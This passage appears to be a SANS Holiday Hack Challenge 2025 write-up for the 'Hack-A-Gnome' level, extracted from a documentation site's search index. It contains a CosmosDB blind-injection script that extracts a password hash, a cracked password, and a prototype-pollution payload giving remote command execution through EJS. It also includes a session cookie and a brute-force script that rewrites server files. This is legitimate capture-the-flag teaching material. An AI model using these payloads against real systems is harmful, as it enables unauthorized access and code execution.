</p>"},{"location":"act_3/hack_a_gnome/#objective","title":"Objective","text":"<p>Task description</p> <p>Davis in the Data Center is fighting a gnome army\u2014join the hack-a-gnome fun.</p> Chris Davis <p>Hi, my name is Chris.</p> <p>I like miniature war gaming and painting minis.</p> <p>I enjoy open source projects and amateur robotics.</p> <p>Hiking and kayaking are my favorite IRL activies.</p> <p>I love single player video games with great stoylines.</p> <p>Hey, I could really use another set of eyes on this gnome takeover situation.</p> <p>Their systems have multiple layers of protection now - database authentication, web application vulnerabilities, and more!</p> <p>But every system has weaknesses if you know where to look.</p> <p>If these gnomes freeze the whole neighborhood, forget about hiking or kayaking\u2014everything will be one giant ice rink. And trust me, miniature war gaming is a lot less fun when your paint freezes solid.</p> <p>Ready to help me turn one of these rebellious bots against its own kind?</p>"},{"location":"act_3/hack_a_gnome/#hints","title":"Hints","text":"Hack-A-Gnome <p>Sometimes, client-side code can interfere with what you submit. Try proxying your requests through a tool like Burp Suite or OWASP ZAP. You might be able to trigger a revealing error message.</p> Hack-A-Gnome <p>Once you determine the type of database the gnome control factory's login is using, look up its documentation on default document types and properties. This information could help you generate a list of common English first names to try in your attack.</p> Hack-A-Gnome <p>There might be a way to check if an attribute IS_DEFINED on a given entry. This could allow you to brute-force possible attribute names for the target user's entry, which stores their password hash. Depending on the hash type, it might already be cracked and available online where you could find an online cracking station to break it.</p> Hack-A-Gnome <p>I actually helped design the software that controls the factory back when we used it to make toys. It's quite complex. After logging in, there is a front-end that proxies requests to two main components: a backend Statistics page, which uses a per-gnome container to render a template with your gnome's stats, and the UI, which connects to the camera feed and sends control signals to the factory, relaying them to your gnome (assuming the CAN bus controls are hooked up correctly). Be careful, the gnomes shutdown if you logout and also shutdown if they run out of their 2-hour battery life (which means you'd have to start all over again).</p> Hack-A-Gnome <p>Oh no, it sounds like the CAN bus controls are not sending the correct signals! If only there was a way to hack into your gnome's control stats/signal container to get command-line access to the smart-gnome. This would allow you to fix the signals and control the bot to shut down the factory. During my development of the robotic prototype, we found the factory's pollution to be undesirable, which is why we shut it down. If not updated since then, the gnome might be running on old and outdated packages.</p> Hack-A-Gnome <p>Nice! Once you have command-line access to the gnome, you'll need to fix the signals in the <code>canbus_client.py</code> file so they match up correctly. After that, the signals you send through the web UI to the factory should properly control the smart-gnome. You could try sniffing CAN bus traffic, enumerating signals based on any documentation you find, or brute-forcing combinations until you discover the right signals to control the gnome from the web UI.</p>"},{"location":"act_3/hack_a_gnome/#solution","title":"Solution","text":"<p>There are multiple stages we need to go through to solve this challenge.</p>"},{"location":"act_3/hack_a_gnome/#login","title":"Login","text":"<p>We get a login prompt when going to the webpage.</p> <p></p> <p>Login prompt.</p>"},{"location":"act_3/hack_a_gnome/#username-enumeration","title":"Username Enumeration","text":"<p>The <code>Create Account</code> page allows us to enumerate usernames as it instantly provides feedback on whether a username is still available. We can query common English names:</p> Enumerate usernames using ffuf<pre><code>ffuf -w ./malenames-usa-top1000.txt -u https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=FUZZ -fs 18\nHAROLD                  [Status: 200, Size: 19, Words: 1, Lines: 1]\nBRUCE                   [Status: 200, Size: 19, Words: 1, Lines: 1]\n</code></pre> <p>We now know that two accounts exist with <code>HAROLD</code> and <code>BRUCE</code> as username.</p>"},{"location":"act_3/hack_a_gnome/#sql-injection","title":"SQL Injection","text":"<p>Putting a <code>\"</code> in the username field on the <code>Create Account</code> page generates an error:</p> <pre><code>Error: An error occurred while checking username: Message: {\"errors\":[{\"severity\":\"Error\",\"location\":{\"start\":44,\"end\":45},\"code\":\"SC1012\",\"message\":\"Syntax error, invalid string literal token '\\\"'.\"}]} ActivityId: 27cab604-4a72-4736-9d48-3ebaa577a5a4, Microsoft.Azure.Documents.Common/2.14.0\n</code></pre> <p>We learn that the backend appears to be using Azure DocumentDB/CosmosDB and that it is injectable.</p> <p>We can leverage the IS_DEFINED() function of Microsoft CosmosDB to find the password hash of a user object in the database. CosmosDB queries frequently use <code>c</code> as document alias and have <code>id</code> as a key. We can test this as follows using <code>IS_DEFINED()</code>:</p> <pre><code># Try 'id' as key\n\" OR IS_DEFINED(c.id) --\n\n# Try 'digest' as key\n\" OR IS_DEFINED(c.digest) --\n</code></pre> <p>This returns <code>Username is taken</code> for both, which indicates it returned <code>TRUE</code> meaning the alias and keys exist. The <code>digest</code> will contain the password hash we are looking for.</p> <p>Therefore, the backend query must look something like this:</p> <pre><code>SELECT IIF(COUNT(1) = 0, true, false) AS available\nFROM c\nWHERE c.username = \"&lt;username&gt;\"\n</code></pre> <p>AI usage</p> <p>ChatGPT was used to learn more about the SQL query potentially in use in the backend, what alias is typically used when querying values CosmosDB, and what key names could be used to save a password hash.</p> <p>We can leverage scripting to brute-force our way to the password by using the function <code>STARTSWITH()</code> and testing different character sequences. This is similar to the trick used in the HHC 2024 challenge Deactivate Frostbit Naughty-Nice List Publication.</p> Python SQL injection script to find password hash <p>This script will try all characters until the <code>STARTSWITH()</code> functions returns <code>TRUE</code>. If <code>TRUE</code>, then it saves that character and looks for the next one in the sequence.</p> <pre><code>import requests\nimport string\n\n# Target endpoint (expects ?value=... or similar)\nbase_url = \"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable\"\n\n# Characters to iterate over\ncharacters = string.ascii_lowercase + string.digits\n\ndef check_value(char, result):\n    # Construct a benign query value for probing\n    query_value = f\"{result}{char}\"\n    url = f'{base_url}?username=\" OR STARTSWITH(c.digest, \"{query_value}\") --'\n\n    response = requests.get(url)\n    data = response.json()\n\n    # Expect a structure like: { \"available\": true }\n    return data.get(\"available\", False)\n\ndef run_probe():\n    result = \"\"\n    position = 0\n\n    while True:\n        matched = None\n\n        for char in characters:\n            print(f\"Testing position {position} with '{char}'\")\n\n            if not(check_value(char, result)):\n                matched = char\n                result = result + char\n                print(f\"Match at position {position}: '{char}'\")\n                break\n\n        if matched is None:\n            break\n\n        position += 1\n\n        # External stopping condition to avoid infinite loops\n        if position &gt; 64:\n            break\n\n    return \"\".join(result)\n\nif __name__ == \"__main__\":\n    print(\"Starting boolean\u2011based probe...\")\n    output = run_probe()\n    print(\"Result:\", output)\n</code></pre> <p>AI usage</p> <p>ChatGPT was used to adapt the injection script used for last year's HHC.</p> Password <p>The Python script will return the MD5 hash <code>d0a9ba00f80cbc56584ef245ffc56b9e</code>. Using crackstation.net we can decode this to the password <code>oatmeal12</code>. We test this password with both usernames (<code>BRUCE</code> and <code>HAROLD</code>) and find that it's the password of <code>BRUCE</code>.</p> <p></p> <p>Decoding password hash.</p>"},{"location":"act_3/hack_a_gnome/#prototype-pollution","title":"Prototype Pollution","text":"<p>After login we see the following:</p> <p></p> <p>Decoding password hash.</p> <p>The <code>Gnome Statistics</code> window displays values for certain keys and the <code>Gnome Control Interface</code> window displays a robot in some sort of maze. We have movement controls but we get errors when we try to use them. We will need to fix this to move the robot around and get to the control panel in the upper left corner. We also have a button <code>Update Name</code> with which we can push changes to keys in the statistics object.</p> <p>The hints tell us we need to find a vulnerability that we can exploit using prototype polution.</p> <p>AI usage</p> <p>Gemini Pro 3 helped navigating this part of the challenge and provided helpful suggestions.</p> <p>We will leverage the <code>Update Name</code> functionality to push values to the prototype JavaScript object. This GitHub issue inspired the subkey to pollute for RCE:</p> Prototype pollution<pre><code>{\n  \"action\": \"update\",\n  \"key\": \"__proto__\",\n  \"subkey\": \"outputFunctionName\",\n  \"value\": \"x;return global.process.mainModule.require('child_process').execSync('ls').toString(); //\"\n}\n</code></pre> Prototype pollution request <p>We send a request with this payload encoded in the URL as follows:</p> <pre><code>%7B%0A%20%20%22action%22:%20%22update%22,%0A%20%20%22key%22:%20%22__proto__%22,%0A%20%20%22subkey%22:%20%22outputFunctionName%22,%0A%20%20%22value%22:%20%22x;return%20global.process.mainModule.require('child_process').execSync('ls').toString();%20//%22%0A%7D\n</code></pre> <p></p> <p>Burp request.</p> <p>This returns the following when refreshing the statistics page, proving that the exploit works:</p> <pre><code>README.md canbus_client.py node_modules package-lock.json package.json server.js views\n</code></pre> <p>We can now execute code remotely.</p>"},{"location":"act_3/hack_a_gnome/#can-bus","title":"CAN Bus","text":"<p>The last step we need to execute is to fix the controls of the robot. Using the RCE exploit in the last step we can learn more about the files on the server:</p> README.md <p>This file displays the different CAN IDs in use and indicates that more signals related to controller the robot's movement still have to be implemented.</p> README.md<pre><code># \ud83c\udf84 GnomeBot CAN Bus Protocol - Top Secret Workshop Edition!\n\nHo ho hold on there! Welcome to the inner workings of the GnomeBot's communication system. This marvelous contraption uses the **CAN (Controller Area Network)** bus to chatter away about its status and sometimes even listen to requests. It's like the reindeer telegraph, but with more wires and less sneezing. This document details the known signals whizzing around on the `gcan0` interface. Remember, all multi-byte values are sent **Big Endian** (Most Significant Byte first), just like how Santa lists the nicest kids first! ---\n\n## \ud83c\udf81 CAN Data Requests (Client -&gt; GnomeBot )\n\nSometimes, you need to poke the GnomeBot to get specific information _right now_. Send one of these messages, and the _should_ reply with the corresponding Status/Data message (see below).\n\n| CAN ID (Hex) | Constant Name             | Description                                         | Data Sent |\n| :----------- | :------------------------ | :-------------------------------------------------- | :-------- | --- |\n| `0x400`      | `requestBatteryVoltageID` | Asks for the current battery voltage reading.       | (Empty)   |\n| `0x470`      | `requestGPSFixID`         | Inquires about the current GPS fix status.          | (Empty)   |\n| `0x410`      | `requestMotorSpeedLeftID` | Requests the current speed of the left motor.       | (Empty)   |\n| `0x460`      | `requestSystemTempID`     | Asks for the GnomeBot's internal temperature.       | (Empty)   |\n| `0x4C0`      | `requestPayloadStatusID`  | Requests the current status of the payload/gripper. | (Empty)   | --- |\n\n## \u2728 CAN Status &amp; Data Responses (GnomeBot -&gt; Client)\n\nThese messages are the GnomeBot telling the world (or at least the CAN bus) what's going on. Some are sent automatically like clockwork (Periodic), some only when asked (Response Only), and some do both!\n\n| CAN ID (Hex) | Constant Name                | Behavior            | Data Bytes | Data Type            | Description &amp; Units/Meaning                                                                 |\n| :----------- | :--------------------------- | :------------------ | :--------- | :------------------- | :------------------------------------------------------------------------------------------ | --- |\n| `0x300`      | `statusBatteryVoltageID`     | Response Only       | 2          | `uint16`             | Battery voltage in **millivolts (mV)**. E.g., `0x30D4` = 12500mV = 12.5V.                   |\n| `0x310`      | `statusMotorSpeedLeftID`     | Periodic + Response | 2          | `int16`              | Left motor speed in **RPM**. Can be negative for reverse!                                   |\n| `0x311`      | `statusMotorSpeedRightID`    | Periodic            | 2          | `int16`              | Right motor speed in **RPM**.                                                               |\n| `0x320`      | `statusSonarDistanceFrontID` | Periodic            | 2          | `uint16`             | Front sonar distance reading in **centimeters (cm)**.                                       |\n| `0x321`      | `statusSonarDistanceRearID`  | Periodic            | 2          | `uint16`             | Rear sonar distance reading in **centimeters (cm)**.                                        |\n| `0x330`      | `statusIMUDataID`            | Periodic            | 2          | `byte[0]`, `byte[1]` | Byte 0: Simple sequence/second counter. Byte 1: Status flags (e.g., `0x01` = OK).           |\n| `0x340`      | `statusHeadlightID`          | Periodic            | 1          | `uint8`              | Headlight status: `0x00` = Off, `0x01` = On. Is it Rudolph's spare nose?                    |\n| `0x350`      | `statusWifiStatusID`         | Periodic            | 2          | `byte[0]`, `byte[1]` | Byte 0: WiFi Signal Strength (0-100%). Byte 1: Status (`0`=Disc, `1`=Conn).                 |\n| `0x351`      | `statusBluetoothStatusID`    | Periodic            | 2          | `byte[0]`, `byte[1]` | Byte 0: Number of paired devices. Byte 1: Status (`0`=Off, `1`=On, `2`=Paired).             |\n| `0x360`      | `statusSystemTempID`         | Periodic + Response | 1          | `int8`               | Internal system temperature in **degrees Celsius (\u00b0C)**. Keep it cool, like the North Pole! |\n| `0x370`      | `statusGPSFixID`             | Response Only       | 1          | `uint8`              | GPS Fix Status: `0` = No Fix, `1` = 2D Fix, `2` = 3D Fix.                                   |\n| `0x380`      | `statusWheelOdomLeftID`      | Periodic            | 4          | `uint32`             | Cumulative left wheel odometry ticks. Rollin' towards Christmas!                            |\n| `0x381`      | `statusWheelOdomRightID`     | Periodic            | 4          | `uint32`             | Cumulative right wheel odometry ticks.                                                      |\n| `0x390`      | `statusAmbientLightID`       | Periodic            | 2          | `uint16`             | Ambient light sensor reading in **Lux**. Brighter than Rudolph's nose?                      |\n| `0x391`      | `statusHumidityID`           | Periodic            | 1          | `uint8`              | Relative humidity percentage (%). Is it snowing?                                            |\n| `0x392`      | `statusPressureID`           | Periodic            | 4          | `uint32`             | Barometric pressure in **Pascals (Pa)**.                                                    |\n| `0x3A0`      | `statusCurrentDrawID`        | Periodic            | 2          | `int16`              | Main battery current draw in **milliamps (mA)**. How much juice does this thing use?!       |\n| `0x3B0`      | `statusEstopStatusID`        | Periodic            | 1          | `uint8`              | Emergency Stop Status: `0x00` = OK, `0x01` = PRESSED! (Hopefully not!)                      |\n| `0x3C0`      | `statusPayloadStatusID`      | Periodic + Response | 1          | `uint8` (Bitmap)     | Payload Status: Bit 0 (`0x01`): Gripper Open, Bit 1 (`0x02`): Sensor Active.                |\n| `0x3D0`      | `statusNavStatusID`          | Periodic            | 1          | `uint8`              | Navigation System Status: `0`=Idle, `1`=Navigating, `2`=Reached, `3`=Failed.                |\n| `0x3E0`      | `statusFanSpeedID`           | Periodic            | 1          | `uint8`              | Cooling fan speed percentage (%). Keeping the circuits frosty.                              |\n| `0x3FF`      | `statusHeartbeatID`          | Periodic            | 1          | `uint8`              | Heartbeat counter. Increments with each message. Lub-dub, lub-dub... is it alive?!          | --- |\n\n## \ud83d\udee0\ufe0f Movement Commands &amp; Acknowledgments (Client &lt;-&gt; GnomeBot )\n\n`TODO: There are more signals related to controlling the GnomeBot's movement (Up/Down/Left/Right) and the acknowledgments sent back by the bot. These involve CAN IDs that are not totally settled yet. We are still polishing the documentation for these - check back after eggnog break!` ---\n</code></pre> canbus_client.py <p>This file contains the logic to listen to the CAN bus and send commands. It contains the faulty commands to move the robot; these must be replaced with the correct IDs. There is also <code>listen</code> functionality to understand what is being sent over the CAN bus but it didn't provide us with relevant information.</p> canbus_client.py<pre><code>#!/usr/bin/python3\nimport can\nimport time\nimport argparse\nimport sys\nimport datetime # To show timestamps for received messages\n\n# Define CAN IDs (I think these are wrong with newest update, we need to check the actual device documentation)\nCOMMAND_MAP = {\n    \"up\": 0x656,\n    \"down\": 0x657,\n    \"left\": 0x658,\n    \"right\": 0x659,\n    # Add other command IDs if needed\n    }\n\n# Add 'listen' as a special command option\nCOMMAND_CHOICES = list(COMMAND_MAP.keys()) + [\"listen\"]\nIFACE_NAME = \"gcan0\"\n\ndef send_command(bus, command_id): \"\"\"Sends a CAN message with the given command ID.\"\"\"\n    message = can.Message(\n        arbitration_id=command_id,\n        data=[], # No specific data needed for these simple commands\n        is_extended_id=False\n    )\n\n    try:\n        bus.send(message)\n        print(f\"Sent command: ID=0x{command_id:X}\")\n\n    except can.CanError as e:\n        print(f\"Error sending message: {e}\")\n\ndef listen_for_messages(bus): \"\"\"Listens for CAN messages and prints them.\"\"\"\n    print(f\"Listening for messages on {bus.channel_info}. Press Ctrl+C to stop.\")\n\n    try:\n        # Iterate indefinitely over messages received on the bus\n        for msg in bus:\n            # Get current time for the timestamp\n            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3] # Milliseconds precision\n            print(f\"{timestamp} | Received: {msg}\") # You could add logic here to filter or react to specific messages\n            # if msg.arbitration_id == 0x100:\n                # print(\" (Noise message)\")\n\n    except KeyboardInterrupt:\n        print(\"\\nStopping listener...\")\n\n    except Exception as e:\n        print(f\"\\nAn error occurred during listening: {e}\")\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Send CAN bus commands or listen for messages.\")\n    parser.add_argument(\n        \"command\", choices=COMMAND_CHOICES,\n        help=f\"The command to send ({', '.join(COMMAND_MAP.keys())}) or 'listen' to monitor the bus.\" )\n    args = parser.parse_args()\n\n    try:\n        # Initialize the CAN bus interface\n        bus = can.interface.Bus(channel=IFACE_NAME, interface='socketcan', receive_own_messages=False)\n        # Set receive_own_messages if needed\n        print(f\"Successfully connected to {IFACE_NAME}.\")\n\n    except OSError as e:\n        print(f\"Error connecting to CAN interface {IFACE_NAME}: {e}\")\n        print(f\"Make sure the {IFACE_NAME} interface is up ('sudo ip link set up {IFACE_NAME}')\")\n        print(\"And that you have the necessary permissions.\")\n        sys.exit(1)\n\n    except Exception as e:\n        print(f\"An unexpected error occurred during bus initialization: {e}\")\n        sys.exit(1)\n\n    if args.command == \"listen\":\n        listen_for_messages(bus)\n    else:\n        command_id = COMMAND_MAP.get(args.command)\n\n    if command_id is None:\n        # Should not happen due to choices constraint\n        print(f\"Invalid command for sending: {args.command}\")\n\n        bus.shutdown()\n        sys.exit(1)\n        send_command(bus, command_id)\n        # Give a moment for the message to be potentially processed if listening elsewhere\n        time.sleep(0.1)\n        # Shutdown the bus connection cleanly\n        bus.shutdown()\n        print(\"CAN bus connection closed.\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> server.js <p>This file contains the logic used to drive the wegpage.</p> <p>AI usage</p> <p>Script was formatted by ChatGPT.</p> server.js<pre><code>require(\"dotenv\").config();\nconst express = require(\"express\");\nconst dns = require(\"dns\");\nconst path = require(\"path\");\nconst { exec } = require(\"child_process\");\n\nconst app = express();\n\n// --- Environment Variables &amp; Initial Setup ---\nconst PARENTID = process.env.PARENTID;\nlet allowedIps = null;\n\nif (PARENTID) {\nconsole.log(`PARENTID is set to: ${PARENTID}. Resolving...`);\ndns.lookup(PARENTID, { all: true }, (err, addresses) =&gt; {\n    if (err) {\n    console.error(\n        `Failed to resolve PARENTID hostname \"${PARENTID}\": ${err.message}. Allowing all connections.`\n    );\n    } else if (addresses &amp;&amp; addresses.length &gt; 0) {\n    allowedIps = addresses.map((addr) =&gt; addr.address).join(\", \");\n    console.log(\n        `Resolved PARENTID \"${PARENTID}\" to IPs: ${allowedIps}. Only these IPs will be allowed.`\n    );\n    } else {\n    console.warn(\n        `PARENTID \"${PARENTID}\" resolved, but no IP addresses found. Allowing all connections.`\n    );\n    }\n});\n} else {\nconsole.log(\n    \"PARENTID environment variable not set. Allowing all connections.\"\n);\n}\n\n// Middleware\napp.use(express.json());\napp.use(express.urlencoded({ extended: true }));\n\n// --- IP Filtering Middleware ---\napp.use((req, res, next) =&gt; {\nif (allowedIps === null) return next();\n\nconst clientIp = req.ip.split(\":\").pop();\nif (allowedIps.includes(clientIp)) {\n    next();\n} else {\n    console.warn(\n    `Rejected connection from ${clientIp} (does not match PARENTID IPs: ${allowedIps})`\n    );\n    res\n    .status(403)\n    .send(\n        \"Forbidden: Access denied. \" +\n        `Rejected connection from ${clientIp} (does not match PARENTID IPs: ${allowedIps})`\n    );\n}\n});\n\n// --- Serve Static Files ---\napp.use(\"/static\", express.static(path.join(__dirname, \"static\")));\napp.set(\"view engine\", \"ejs\");\n\n// --- Game Constants ---\nconst gnomebotname = \"GnomeBot\" + Math.floor(Math.random() * 99999);\nconst containerUsername = process.env.USERNAME || \"Unknown\";\nconst processStartTime = Date.now();\n\nconst gnomeBotObjectDetails = {\nsettings: {\n    name: gnomebotname,\n    model_version: \"2.3.8\",\n    firmware_version: \"GNM-4.12.0\",\n},\n};\n\n// Routes\napp.get(\"/home\", (req, res) =&gt; {\nres.setHeader(\"Content-Type\", \"text/html\");\nres.sendFile(path.join(__dirname, \"views\", \"home.ejs\"));\n});\n\napp.get(\"/control\", (req, res) =&gt; {\nres.setHeader(\"Content-Type\", \"text/html\");\nres.sendFile(path.join(__dirname, \"views\", \"control.ejs\"));\n});\n\napp.get(\"/stats\", (req, res) =&gt; {\nconsole.log(\"Rendering stats view\");\n\nconst gnomeStats = [\n    {\n    name: \"name\",\n    value: gnomeBotObjectDetails?.settings?.name || gnomebotname,\n    },\n    {\n    name: \"model_version\",\n    value: gnomeBotObjectDetails?.settings?.model_version || \"Unknown\",\n    },\n    {\n    name: \"description\",\n    value: \"Holiday remote controlled gnome for your home.\",\n    },\n    { name: \"status\", value: \"active\" },\n    { name: \"last_updated\", value: new Date().toISOString() },new\n    { name: \"last_updated_by\", value: containerUsername },\n    { name: \"last_accessed_by\", value: containerUsername },\n    {\n    name: \"battery_level\",\n    value:\n        Math.max(\n        0,\n        100 -\n            Math.floor(\n            ((Date.now() - processStartTime) / (2 * 60 * 60 * 1000)) * 100\n            )\n        ) + \"%\",\n    },\n    {\n    name: \"uptime\",\n    value: Math.floor((Date.now() - processStartTime) / 1000) + \" seconds\",\n    },\n    {\n    name: \"cpu_temperature\",\n    value: (Math.random() * 30 + 40).toFixed(1) + \"\u00b0C\",\n    },\n    { name: \"current_task\", value: \"Idle\" },\n    { name: \"network_status\", value: \"Connected\" },\n    { name: \"error_logs\", value: \"None\" },\n    { name: \"gnome_mode\", value: \"Stealth\" },\n    {\n    name: \"firmware_version\",\n    value: gnomeBotObjectDetails?.settings?.firmware_version || \"Unknown\",\n    },\n    {\n    name: \"gnome_mood\",\n    value: [\"Happy\", \"Grumpy\", \"Mischievous\"][Math.floor(Math.random() * 3)],\n    },\n    { name: \"light_sensor\", value: Math.random() &gt; 0.5 ? \"Bright\" : \"Dim\" },\n    {\n    name: \"gnome_config_object\",\n    value: JSON.stringify(gnomeBotObjectDetails),\n    },\n];\n\nres.setHeader(\n    \"Cache-Control\",\n    \"no-store, no-cache, must-revalidate, proxy-revalidate\"\n);\nres.setHeader(\"Pragma\", \"no-cache\");\nres.setHeader(\"Expires\", \"0\");\n\nres.render(\"stats\", { gnomeStats });\n});\n\napp.get(\"/ctrlsignals\", (req, res) =&gt; {\nconst requestPayload = JSON.parse(decodeURIComponent(req.query.message));\n\nres.setHeader(\n    \"Cache-Control\",\n    \"no-store, no-cache, must-revalidate, proxy-revalidate\"\n);\nres.setHeader(\"Pragma\", \"no-cache\");\nres.setHeader(\"Expires\", \"0\");\n\nif (!requestPayload || !requestPayload.action) {\n    console.error(\"Invalid request payload\");\n    res.status(400).send(\"Invalid request payload\");\n    return;\n}\n\nswitch (requestPayload.action) {\n    case \"move\": {\n    console.log(`Moving in direction: ${requestPayload.direction}`);\n    res.header(\"Content-Type\", \"application/json\");\n\n    if (!requestPayload.direction) {\n        res.send(\n        JSON.stringify({\n            type: \"message\",\n            data: \"error\",\n            message: \"No direction specified\",\n        })\n        );\n        return;\n    }\n\n    const direction = requestPayload.direction;\n    const command = `/usr/bin/python3 /app/canbus_client.py \"${direction}\"`;\n\n    switch (direction) {\n        case \"left\":\n        case \"right\":\n        case \"up\":\n        case \"down\":\n        console.log(`Executing command: ${command}`);\n        exec(command, (error, stdout, stderr) =&gt; {\n            if (error) {\n            console.error(`Error executing command: ${error.message}`);\n            return;\n            }\n            if (stderr) {\n            console.error(`Command stderr: ${stderr}`);\n            return;\n            }\n            console.log(`Command stdout: ${stdout}`);\n        });\n\n        res.send(\n            JSON.stringify({\n            type: \"message\",\n            data: \"success\",\n            message: `Moving ${direction}`,\n            })\n        );\n        break;\n\n        default:\n        console.error(\"Unknown direction\");\n        res.send(\n            JSON.stringify({\n            type: \"message\",\n            data: \"error\",\n            message: \"Unknown direction\",\n            })\n        );\n        return;\n    }\n\n    break;\n    }\n\n    case \"update\": {\n    try {\n        const { key, subkey, value } = requestPayload;\n        gnomeBotObjectDetails[key][subkey] = value;\n\n        res.header(\"Content-Type\", \"application/json\");\n        res.send(\n        JSON.stringify({\n            type: \"message\",\n            data: \"success\",\n            message: `Updated ${key}.${subkey} to ${value}`,\n        })\n        );\n    } catch (error) {\n        res.setHeader(\"Content-Type\", \"application/json\");\n        res.send(\n        JSON.stringify({\n            type: \"message\",\n            data: \"error\",\n            message: `Error updating settings: ${error.message}`,\n        })\n        );\n    }\n    break;\n    }\n\n    default:\n    console.error(\"Unknown action\");\n    res.status(400).send(\"Unknown action\");\n    return;\n}\n});\n\n// Health check\napp.get(\"/healthz\", (req, res) =&gt; {\nres.status(200).send(\"OK\");\n});\n\n// --- Server Setup ---\nconst PORT = process.env.PORT || 3000;\n\napp.listen(PORT, () =&gt; {\nconsole.log(`Server (HTTP only) running on port ${PORT}`);\n});\n</code></pre> <p>One way to find the correct CAN IDs to move the robot is by brute forcing all options. We can replace the IDs in <code>canbus_client.py</code> using <code>sed</code>:</p> <pre><code>sed -i \\\"s/0x656/0x700/g\\\" canbus_client_test.py\n</code></pre> <p>We generate a Python script that replaces the CAN ID of one of the movement actions using prototype pollution and attempts to move the robot to see if it returns success. It makes sure to copy the original version of the script first to limit breaking the webapp and make replacing the correct value easier.</p> <p>AI usage</p> <p>Gemini Pro 3 was used to generate this script.</p> Python brute force script <pre><code>#!/usr/bin/env python3\nimport requests\nimport urllib.parse\n\n# Base URL and headers\nBASE_URL = \"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals\"\nHEADERS = {\n    \"Host\": \"hhc25-smartgnomehack-prod.holidayhackchallenge.com\",\n    \"Cookie\": \"connect.sid=s%3Ar6TrKtH1WpRIbFfK2Ty8sVh9A9ivJs-h.d3CdBPNL%2F0HWxFlPph3R7LzzFV3qcKd22qBAGBJI%2B4Q\",\n    \"Accept\": \"*/*\"\n}\n\n# Command template with placeholder\nCOMMAND_TEMPLATE = \"\"\"{\n\"action\": \"update\",\n\"key\": \"__proto__\",\n\"subkey\": \"outputFunctionName\",\n\"value\": \"x;return global.process.mainModule.require('child_process').execSync('sed -i \\\\\"s/0x656/REPLACE_HEX/g\\\\\" canbus_client.py').toString(); //\"\n}\"\"\"\n\nCOMMAND_COPY = \"\"\"{\n\"action\": \"update\",\n\"key\": \"__proto__\",\n\"subkey\": \"outputFunctionName\",\n\"value\": \"x;return global.process.mainModule.require('child_process').execSync('cp canbus_client_copy.py canbus_client.py').toString(); //\"\n}\"\"\"\n\nCOMMAND_SETUP = \"\"\"{\n\"action\": \"update\",\n\"key\": \"__proto__\",\n\"subkey\": \"outputFunctionName\",\n\"value\": \"x;return global.process.mainModule.require('child_process').execSync('cp canbus_client.py canbus_client_copy.py').toString(); //\"\n}\"\"\"\n\nCOMMAND_BACKUP = \"\"\"{\n\"action\": \"update\",\n\"key\": \"__proto__\",\n\"subkey\": \"outputFunctionName\",\n\"value\": \"x;return global.process.mainModule.require('child_process').execSync('cp canbus_client.py canbus_client_backup.py').toString(); //\"\n}\"\"\"\n\nCOMMAND_TRY = \"\"\"{\"action\":\"move\",\"direction\":\"up\"}\"\"\"\n\n# Setup\nencoded_command = urllib.parse.quote(COMMAND_SETUP)\n# Send the control signal\nresp = requests.get(f\"{BASE_URL}?message={encoded_command}\", headers=HEADERS)\nprint(f\"Copied python file, status: {resp.status_code}\")\nwatch_resp = requests.get(\"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats\", headers=HEADERS)\n\nencoded_command = urllib.parse.quote(COMMAND_BACKUP)\n# Send the control signal\nresp = requests.get(f\"{BASE_URL}?message={encoded_command}\", headers=HEADERS)\nprint(f\"Copied python file, status: {resp.status_code}\")\nwatch_resp = requests.get(\"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats\", headers=HEADERS)\n\n# Loop over hex values 0x000 to 0x999\nfor n in range(0x100, 0x99A):\n    # Copy python script for fresh version\n    encoded_command = urllib.parse.quote(COMMAND_COPY)\n    # Send the control signal\n    resp = requests.get(f\"{BASE_URL}?message={encoded_command}\", headers=HEADERS)\n    print(f\"Copied python file, status: {resp.status_code}\")\n    watch_resp = requests.get(\"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats\", headers=HEADERS)\n\n    # Change hex value for 'up'\n    hexval = f\"0x{n:03x}\"\n    command = COMMAND_TEMPLATE.replace(\"REPLACE_HEX\", hexval)\n    encoded_command = urllib.parse.quote(command)\n    # Send the control signal\n    resp = requests.get(f\"{BASE_URL}?message={encoded_command}\", headers=HEADERS)\n    print(f\"Sent {hexval}, status: {resp.status_code}\")\n    watch_resp = requests.get(\"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats\", headers=HEADERS)\n\n    # Try 'up' command\n    encoded_command = urllib.parse.quote(COMMAND_TRY)\n    resp = requests.get(f\"{BASE_URL}?message={encoded_command}\", headers=HEADERS)\n    print(f\"Tried 'up' command, status: {resp.status_code}\")\n    watch_resp = requests.get(\"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats\", headers=HEADERS)\n    print(f\"Watching output, length: {len(watch_resp.text)}\")\n    print(resp)\n</code></pre> CAN IDs <p>Using the script, we find the following CAN IDs for moving the robot:</p> <pre><code>0x201\n0x202\n0x203\n0x204\n</code></pre>"},{"location":"act_3/hack_a_gnome/#maze","title":"Maze","text":"<p>The final step involves moving the robot through the maze with boxes. We can push boxes forward to create a path.</p> Maze <p>We can create the following path to get to the control box and solve the challenge:</p> <p></p> <p>Path through maze.</p>"},{"location":"act_3/hack_a_gnome/#response","title":"Response","text":"<p>Chris Davis</p> <p>Excellent work! You've successfully taken control of the gnome - look at that interface responding to our commands now.</p> <p>Time to turn this little rebel against its own manufacturing operation and shut them down for good!</p>"},{"location":"prologue/holiday_hack_orientation/","title":"Holiday Hack Orientation","text":""},{"location":"prologue/holiday_hack_orientation/#holiday-hack-orientation","title":"Holiday Hack Orientation","text":"<p>Difficulty: </p>"},{"location":"prologue/holiday_hack_orientation/#objective","title":"Objective","text":"<p>Task description</p> <p>Meet Lynn Schifano on the train for a warm welcome and get ready for your journey around the Dosis Neighborhood.</p> Lynn Schifano <p>Welcome to the 2025 SANS Holiday Hack Challenge! We\u2019re on a train heading\u2026 NOT to the North Pole, but instead to The Neighborhood. Your cybersecurity skills are needed there this year! I\u2019m here to help orient you to this year\u2019s exciting challenge.</p> <p>I'm the Chief of Staff at Counter Hack, making sure the right people are doing the right thing at the right place at the right time -- Herding cats, in other words.</p> <p>I love sports, especially college basketball. My favorite 